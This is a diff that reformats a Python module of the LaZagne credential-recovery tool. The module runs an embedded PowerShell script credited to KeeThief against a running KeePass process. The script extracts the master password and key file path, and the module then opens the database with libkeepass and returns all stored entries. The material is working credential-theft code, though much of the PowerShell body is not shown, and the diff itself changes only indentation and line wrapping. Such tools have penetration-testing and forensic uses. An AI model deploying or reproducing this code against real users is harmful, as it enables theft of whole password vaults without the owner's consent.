@@ -9,15 +9,17 @@ from lazagne.config.write_output import print_debug
 from lazagne.config.powershell_execute import powershell_execute
 import libkeepass
 
-class Keepass(ModuleInfo):
-	def __init__(self):
-		options = {'command': '-k', 'action': 'store_true', 'dest': 'keepass', 'help': 'retrieve keepass password using KeeThief'}
-		ModuleInfo.__init__(self, 'keepass', 'memory', options)
 
-	def launch_keeThief(self):
-		# From https://github.com/adaptivethreat/KeeThief/blob/master/PowerShell/KeeThief.ps1
-		function = 'Get-Process KeePass | Get-KeePassDatabaseKey'
-		script = '''
+class Keepass(ModuleInfo):
+    def __init__(self):
+        options = {'command': '-k', 'action': 'store_true', 'dest': 'keepass',
+                   'help': 'retrieve keepass password using KeeThief'}
+        ModuleInfo.__init__(self, 'keepass', 'memory', options)
+
+    def launch_keeThief(self):
+        # From https://github.com/adaptivethreat/KeeThief/blob/master/PowerShell/KeeThief.ps1
+        function = 'Get-Process KeePass | Get-KeePassDatabaseKey'
+        script = '''
 	#requires -version 2
 	function Get-KeePassDatabaseKey {
 		[CmdletBinding()] 
@@ -91,39 +93,40 @@ class Keepass(ModuleInfo):
 		}
 	}
 		'''
-		
-		return powershell_execute(script, function)
 
-	def run(self, software_name = None):
-		values = {}
-		pwdFound = []
-		output = self.launch_keeThief()
-		output = output.replace('\r', '')
-		if output.startswith('Error: '):
-			output = output.replace('Error: ', '').replace('\n', '').replace('\r', '')
-			print_debug('WARNING', output)
-			return 
-		
-		# Parse output
-		for line in output.split('\n'):
-			if line:
-				try:
-					value, content = line.split(':', 1)
-					
-					# Only store not empty results
-					# if content.strip():
-					values[value.strip()] = content.replace('\x00', '').strip()
-				except Exception, e:
-					# execption occurs when not keepass process found
-					print_debug('INFO', 'No Keepass process open !')
-					return
+        return powershell_execute(script, function)
 
-		if values:
-			pwdFound = [values]
-			try:
-				with libkeepass.open(values['Database'], password=values['Password'], keyfile=values['KeyFilePath']) as kdb:
-					pwdFound += kdb.to_dic()
-			except:
-				pass
+    def run(self, software_name=None):
+        values = {}
+        pwdFound = []
+        output = self.launch_keeThief()
+        output = output.replace('\r', '')
+        if output.startswith('Error: '):
+            output = output.replace('Error: ', '').replace('\n', '').replace('\r', '')
+            print_debug('WARNING', output)
+            return
 
-		return pwdFound
+        # Parse output
+        for line in output.split('\n'):
+            if line:
+                try:
+                    value, content = line.split(':', 1)
+
+                    # Only store not empty results
+                    # if content.strip():
+                    values[value.strip()] = content.replace('\x00', '').strip()
+                except Exception, e:
+                    # execption occurs when not keepass process found
+                    print_debug('INFO', 'No Keepass process open !')
+                    return
+
+        if values:
+            pwdFound = [values]
+            try:
+                with libkeepass.open(values['Database'], password=values['Password'],
+                                     keyfile=values['KeyFilePath']) as kdb:
+                    pwdFound += kdb.to_dic()
+            except:
+                pass
+
+        return pwdFound
